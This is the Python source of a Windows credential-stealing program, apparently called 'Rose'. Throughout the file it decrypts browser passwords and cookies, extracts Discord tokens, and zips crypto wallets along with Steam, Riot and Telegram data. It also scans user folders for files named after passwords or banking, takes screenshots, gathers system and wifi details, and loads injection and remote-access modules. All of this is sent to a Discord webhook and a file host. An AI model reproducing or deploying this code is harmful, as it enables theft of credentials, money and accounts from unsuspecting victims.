import sys

import _webhook
import discordc
import informations
import malicious
import rat
from config import Config

import injection

ii = informations.Info()
_webh = _webhook.WebhookX()
cc = Config()

try:
    import getpass
    import os
    import platform
    import random
    import re
    import shutil
    import socket
    import subprocess
    import threading
    import time
    from base64 import b64decode
    from ctypes import (POINTER, Structure, byref, c_buffer, c_char, cdll,
                        windll, wintypes)
    from json import dumps
    from json import loads
    from json import loads as json_loads
    from sqlite3 import connect as sql_connect
    from sys import argv, executable
    from urllib.request import Request, urlopen
    from zipfile import ZipFile

    import browser_cookie3
    import dhooks
    import psutil
    import requests
    from _roblox import RobloxX
    from anonFile import uploadToAnonfiles
    from Crypto.Cipher import AES
    from PIL import ImageGrab
except Exception:
    import subprocess

    requirements = [
        "requests",
        "Pillow",
        "pycryptodome",
        "psutil",
        "WMI",
        "discord",
        "dhooks",
        "browser_cookie3",
    ]
    # the [0:-3] removes the leading " &&"
    command = " ".join([
        f"python -m pip install {requirement} &&"
        for requirement in requirements
    ])[0:-3]
    subprocess.run(command, shell=True)

if platform.system() != "Windows":
    exit()


def writeforfile(data, name):
    path = os.getenv("TEMP") + f"\wp{name}.txt"
    with open(path, mode="w", encoding="utf-8") as f:
        f.write("< - lol -->\n\n")
        for line in data:
            if line[0] != "":
                f.write(f"{line}\n")


webhook = cc.get_webhook()
debug_mode = cc.get_debug_mode()
wh_avatar = cc.get_avatar()
wh_name = cc.get_name()
eb_color = cc.get_color()
eb_footer = cc.get_footer()

local = os.getenv("LOCALAPPDATA")
roaming = os.getenv("APPDATA")
temp = os.getenv("TEMP")
startup_loc = roaming + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
Threadlist = []
DETECTED = False

payload1 = {
    "content":
    "<:pikachusign:1084901293669220422> **AYOOO GRABBED SOME DUMMY** ||@everyone||",
    "username": wh_name,
    "avatar_url": wh_avatar,
}
payload2 = {
    "content": "https://cdn.discordapp.com/emojis/1084901411768238190.gif",
    "username": wh_name,
    "avatar_url": wh_avatar,
}
payload3 = {
    "content": "https://cdn.discordapp.com/emojis/1084901431531798641.gif",
    "username": wh_name,
    "avatar_url": wh_avatar,
}
response = requests.post(webhook, json=payload1)
response = requests.post(webhook, json=payload2)
response = requests.post(webhook, json=payload3)


class DATA_BLOB(Structure):
    _fields_ = [("cbData", wintypes.DWORD), ("pbData", POINTER(c_char))]


def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw


def CryptUnprotectData(encrypted_bytes, entropy=b""):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None,
                                         byref(blob_entropy), None, None, 0x01,
                                         byref(blob_out)):
        return GetData(blob_out)


def DecryptValue(buff, master_key=None):
    starts = buff.decode(encoding="utf8", errors="ignore")[:3]
    if starts in ("v10", "v11"):
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass


def Reformat(listt):
    e = re.findall("(\w+[a-z])", listt)
    while "https" in e:
        e.remove("https")
    while "com" in e:
        e.remove("com")
    while "net" in e:
        e.remove("net")
    return list(set(e))


Passw = []


def LoadUrlib(webhook, data="", files="", headers=""):
    if headers != "":
        r = urlopen(Request(webhook, data=data, headers=headers))
        print(r)
        return r
    r = urlopen(Request(webhook, data=data))
    print(r)
    return r


def Trust(Cookies):
    # simple Trust Factor system
    global DETECTED
    data = str(Cookies)
    tim = re.findall(".google.com", data)
    if len(tim) < 1:
        DETECTED = True
        return DETECTED
    DETECTED = False
    return DETECTED


dclass = discordc.DiscordX()


def upload(name, link):
    headers = {
        "Content-Type":
        "application/json",
        "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
    }

    if name == "kiwi":
        data = {
            "content":
            "",
            "embeds": [{
                "color":
                3449140,
                "fields": [{
                    "name": "Interesting files found on user PC:",
                    "value": link
                }],
                "author": {
                    "name": "Rose | File stealer"
                },
                "footer": {
                    "text": eb_footer,
                    "icon_url": "",
                },
            }],
            "avatar_url":
            wh_avatar,
            "attachments": [],
        }
        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
        return

    if name == "wpcook":
        rb = "  -  ".join(da for da in cookiWords)
        if len(rb) > 1000:
            rrrrr = Reformat(str(cookiWords))
            rb = "  -  ".join(da for da in rrrrr)
        data = {
            "content":
            "",
            "embeds": [{
                "title": f"{wh_name}  -  Cookie Grabber",
                "description":
                f"**Found**:\n{rb}\n\n**Data:**\n**{CookiCount}** Cookies Found\n[RoseCookies.txt]({link})",
                "color": eb_color,
                "footer": {
                    "text": eb_footer,
                    "icon_url": "",
                },
            }],
            "username":
            wh_name,
            "avatar_url":
            wh_avatar,
            "attachments": [],
        }
        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
        return

    if name == "wppassw":
        ra = "  -  ".join(da for da in paswWords)
        if len(ra) > 1000:
            rrr = Reformat(str(paswWords))
            ra = "  -  ".join(da for da in rrr)

        data = {
            "content":
            "",
            "embeds": [{
                "title": f"{wh_name}  -  Password Grabber",
                "description":
                f"**Found**:\n{ra}\n\n**Data:**\n**{PasswCount}** Passwords Found\n[RosePasswords.txt]({link})",
                "color": eb_color,
                "footer": {
                    "text": eb_footer,
                    "icon_url": "",
                },
            }],
            "username":
            wh_name,
            "avatar_url":
            wh_avatar,
            "attachments": [],
        }
        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
        return


Tokens = ""
dclass = discordc.DiscordX()


def GetTokens(path, arg):
    if not os.path.exists(path):
        return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb"):
            for line in [
                    x.strip() for x in open(f"{path}\\{file}",
                                            errors="ignore").readlines()
                    if x.strip()
            ]:
                for regex in (
                        r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}",
                        r"mfa\.[\w-]{80,95}",
                ):
                    for token in re.findall(regex, line):
                        global Tokens
                        if dclass.checkToken(token) and token not in Tokens:
                            Tokens += token
                            dclass.uploadToken(token)


Passw = []


def GetPasswords(path, arg):
    global Passw, PasswCount
    if not os.path.exists(path):
        return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0:
        return

    tempfold = (
        temp + "wp" +
        "".join(random.choice("bcdefghijklmnopqrstuvwxyz")
                for i in range(8)) + ".db")

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute(
        "SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, "r", encoding="utf-8") as f:
        local_state = json_loads(f.read())
    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data:
        if row[0] != "":
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split("[")[1].split("]")[0]
                if wa in row[0] and old not in paswWords:
                    paswWords.append(old)
            Passw.append(
                f"URL: {row[0]}|Username: {row[1]}|Password: {DecryptValue(row[2], master_key)}"
            )
            PasswCount += 1
    writeforfile(Passw, "passw")


def GetDiscord(path, arg):
    if not os.path.exists(f"{path}/Local State"):
        return

    pathC = path + arg

    pathKey = path + "/Local State"
    with open(pathKey, "r", encoding="utf-8") as f:
        local_state = json_loads(f.read())
    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = CryptUnprotectData(master_key[5:])
    # print(path, master_key)

    for file in os.listdir(pathC):
        # print(path, file)
        if file.endswith(".log") or file.endswith(".ldb"):
            for line in [
                    x.strip() for x in open(f"{pathC}\\{file}",
                                            errors="ignore").readlines()
                    if x.strip()
            ]:
                for token in re.findall(
                        r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global Tokens
                    tokenDecoded = DecryptValue(
                        b64decode(token.split("dQw4w9WgXcQ:")[1]), master_key)
                    if dclass.checkToken(
                            tokenDecoded) and tokenDecoded not in Tokens:
                        # print(token)
                        Tokens += tokenDecoded
                        # writeforfile(Tokens, 'tokens')
                        dclass.uploadToken(tokenDecoded)


def ZipTelegram(path, arg, procc):
    global OtherZip
    pathC = path
    name = arg
    if not os.path.exists(pathC):
        return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if (".zip" not in file and "tdummy" not in file
                and "user_data" not in file and "webview" not in file):
            zf.write(pathC + "/" + file)
    zf.close()

    lnik = uploadToAnonfiles(f"{pathC}/{name}.zip")
    os.remove(f"{pathC}/{name}.zip")
    df = dhooks.Webhook(webhook)
    df.send(lnik)
    OtherZip.append([arg, lnik])


Cookies = []


def GetCookies(path, arg):
    global Cookies, CookiCount
    if not os.path.exists(path):
        return

    pathC = path + arg + "/Cookies"
    if os.stat(pathC).st_size == 0:
        return

    tempfold = (
        temp + "wp" +
        "".join(random.choice("bcdefghijklmnopqrstuvwxyz")
                for i in range(8)) + ".db")

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"

    with open(pathKey, "r", encoding="utf-8") as f:
        local_state = json_loads(f.read())
    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data:
        if row[0] != "":
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split("[")[1].split("]")[0]
                if wa in row[0] and old not in cookiWords:
                    cookiWords.append(old)
            Cookies.append(
                f"Host Key: {row[0]}|Name: {row[1]}|Value: {DecryptValue(row[2], master_key)}"
            )
            CookiCount += 1
    writeforfile(Cookies, "cook")


def ZipThings(path, arg, procc):
    pathC = path
    name = arg
    global WalletsZip, GamingZip, OtherZip
    # subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
    # os.system(f"taskkill /im {procc} /t /f")

    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(" ", "")
        name = f"Metamask_{browser}"
        pathC = path + arg

    if not os.path.exists(pathC):
        return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    if "Wallet" in arg or "NationsGlory" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(" ", "")
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"):
            return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        # print(data)
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False:
            return
        name = arg

    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if ".zip" not in file:
            zf.write(pathC + "/" + file)
    zf.close()

    lnik = uploadToAnonfiles(f"{pathC}/{name}.zip")
    os.remove(f"{pathC}/{name}.zip")

    ef = dhooks.Webhook(webhook)
    ef.send(lnik)


def GatherAll():
    browserPaths = [
        [
            f"{roaming}/Opera Software/Opera GX Stable",
            "opera.exe",
            "/Local Storage/leveldb",
            "/",
            "/Network",
            "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
        [
            f"{roaming}/Opera Software/Opera Stable",
            "opera.exe",
            "/Local Storage/leveldb",
            "/",
            "/Network",
            "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
        [
            f"{roaming}/Opera Software/Opera Neon/User Data/Default",
            "opera.exe",
            "/Local Storage/leveldb",
            "/",
            "/Network",
            "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
        [
            f"{local}/Google/Chrome/User Data",
            "chrome.exe",
            "/Default/Local Storage/leveldb",
            "/Default",
            "/Default/Network",
            "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
        [
            f"{local}/Google/Chrome SxS/User Data",
            "chrome.exe",
            "/Default/Local Storage/leveldb",
            "/Default",
            "/Default/Network",
            "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
        [
            f"{local}/Google/Chrome/User Data",
            "chrome.exe",
            "/Default/Local Storage/leveldb",
            "/Default",
            "/Default/Network",
            "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
        [
            f"{local}/BraveSoftware/Brave-Browser/User Data",
            "brave.exe",
            "/Default/Local Storage/leveldb",
            "/Default",
            "/Default/Network",
            "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
        [
            f"{local}/Yandex/YandexBrowser/User Data",
            "yandex.exe",
            "/Default/Local Storage/leveldb",
            "/Default",
            "/Default/Network",
            "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
        [
            f"{local}/Microsoft/Edge/User Data",
            "edge.exe",
            "/Default/Local Storage/leveldb",
            "/Default",
            "/Default/Network",
            "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
    ]

    discordPaths = [
        [f"{roaming}/Discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]

    PathsToZip = [
        [
            f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"',
            "Wallet"
        ],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [
            f"{roaming}/NationsGlory/Local Storage/leveldb",
            "NationsGlory.exe",
            "NationsGlory",
        ],
        [
            f"{local}/Riot Games/Riot Client/Data",
            "RiotClientServices.exe",
            "RiotClient",
        ],
    ]
    Telegram = [
        f"{roaming}/Telegram Desktop/tdata", "telegram.exe", "Telegram"
    ]

    if cc.get_token_stealing() is True:
        for patt in browserPaths:
            a = threading.Thread(target=GetTokens, args=[patt[0], patt[2]])
            a.start()
            Threadlist.append(a)

        for patt in discordPaths:
            a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
            a.start()
            Threadlist.append(a)

    if cc.get_password_stealing() is True:
        for patt in browserPaths:
            a = threading.Thread(target=GetPasswords, args=[patt[0], patt[3]])
            a.start()
            Threadlist.append(a)

        for patt in browserPaths:
            threading.Thread(target=ZipThings,
                             args=[patt[0], patt[5], patt[1]]).start()

        for patt in PathsToZip:
            threading.Thread(target=ZipThings,
                             args=[patt[0], patt[2], patt[1]]).start()

    if cc.get_cookie_stealing() is True:
        for patt in browserPaths:
            a = threading.Thread(target=GetCookies, args=[patt[0], patt[4]])
            a.start()
            Threadlist.append(a)

    DETECTED = Trust(Cookies)
    if DETECTED is True:
        return

    # threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()

    for thread in Threadlist:
        thread.join()
    global upths
    upths = []

    if cc.get_password_stealing() is True:
        upload("wppassw",
               uploadToAnonfiles(os.getenv("TEMP") + "\\wppassw.txt"))

    if cc.get_cookie_stealing() is True:
        upload("wpcook", uploadToAnonfiles(os.getenv("TEMP") + "\\wpcook.txt"))


def KiwiFolder(pathF, keywords):
    global KiwiFiles
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file):
            return
        i += 1
        if i <= maxfilesperdir:
            url = uploadToAnonfiles(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    KiwiFiles.append(["folder", pathF + "/", ffound])


KiwiFiles = []


def KiwiFile(path, keywords):
    global KiwiFiles
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append([
                        path + "/" + file,
                        uploadToAnonfiles(path + "/" + file)
                    ])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    KiwiFolder(target, keywords)
                    break

    KiwiFiles.append(["folder", path, fifound])


def Kiwi():
    user = temp.split("\AppData")[0]
    path2search = [
        user + "\\Desktop", user + "\\Downloads", user + "\\Documents"
    ]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "banque",
        "account",
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "secret",
        "bank",
    ]

    wikith = []
    for patt in path2search:
        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles])
        kiwi.start()
        wikith.append(kiwi)
    return wikith


global keyword, cookiWords, paswWords, CookiCount, PasswCount, WalletsZip, GamingZip, OtherZip

keyword = [
    "mail",
    "[coinbase](https://coinbase.com)",
    "[sellix](https://sellix.io)",
    "[gmail](https://gmail.com)",
    "[steam](https://steam.com)",
    "[discord](https://discord.com)",
    "[riotgames](https://riotgames.com)",
    "[youtube](https://youtube.com)",
    "[instagram](https://instagram.com)",
    "[tiktok](https://tiktok.com)",
    "[twitter](https://twitter.com)",
    "[facebook](https://facebook.com)",
    "card",
    "[epicgames](https://epicgames.com)",
    "[spotify](https://spotify.com)",
    "[yahoo](https://yahoo.com)",
    "[roblox](https://roblox.com)",
    "[twitch](https://twitch.com)",
    "[minecraft](https://minecraft.net)",
    "bank",
    "[paypal](https://paypal.com)",
    "[origin](https://origin.com)",
    "[amazon](https://amazon.com)",
    "[ebay](https://ebay.com)",
    "[aliexpress](https://aliexpress.com)",
    "[playstation](https://playstation.com)",
    "[hbo](https://hbo.com)",
    "[xbox](https://xbox.com)",
    "buy",
    "sell",
    "[binance](https://binance.com)",
    "[hotmail](https://hotmail.com)",
    "[outlook](https://outlook.com)",
    "[crunchyroll](https://crunchyroll.com)",
    "[telegram](https://telegram.com)",
    "[pornhub](https://pornhub.com)",
    "[disney](https://disney.com)",
    "[expressvpn](https://expressvpn.com)",
    "crypto",
    "[uber](https://uber.com)",
    "[netflix](https://netflix.com)",
]

CookiCount, PasswCount = 0, 0
cookiWords = []
paswWords = []

WalletsZip = []  # [Name, Link]
GamingZip = []
OtherZip = []

GatherAll()


def send_malicious():
    username = getpass.getuser()
    hostname = socket.gethostname()
    hwid = (str(subprocess.check_output("wmic csproduct get uuid"),
                "utf-8").split("\n")[1].strip())
    name = (str(subprocess.check_output("wmic csproduct get name"),
                "utf-8").split("\n")[1].strip())

    embed = {
        "title":
        f"{name}  -  System Data",
        "description":
        "System Information.",
        "color":
        eb_color,
        "fields": [
            {
                "name": "User",
                "value":
                f"```Host Name: {hostname}\n\nUsername: {username}```",
                "inline": True,
            },
            {
                "name": "System",
                "value":
                f"```OS: {platform.platform()}\n\nProcessor: {platform.processor()}\n\nHWID: {hwid}```",
                "inline": True,
            },
        ],
    }

    requests.post(webhook, json={"embeds": [embed]})

    malicious.wifigr()


screenshot = ImageGrab.grab()
screenshot.save("screenshot.png")
files = {"screenshot": open("screenshot.png", "rb")}
requests.post(webhook, files=files)
files["screenshot"].close()
os.remove("screenshot.png")

if cc.get_password_stealing() is True:
    wikith = Kiwi()
    for thread in wikith:
        thread.join()

    filetext = "\n"
    for arg in KiwiFiles:
        if len(arg[2]) != 0:
            foldpath = arg[1]
            foldlist = arg[2]
            filetext += f":file_folder: {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[1]
                b = ffil[1]
                filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
            filetext += "\n"

    print(filetext)
    upload("kiwi", filetext)

if cc.get_malicious_stealing() is True:
    send_malicious()

if cc.get_injection() is True:
    injection.InjectionX(webhook)

if cc.get_roblox_stealing() is True:
    RobloxX().run()

if cc.get_location_stealing() is True:
    _webh.locations_webhook(ii.global_info())

if cc.get_discord_rat() is True:
    rat.run_rat()
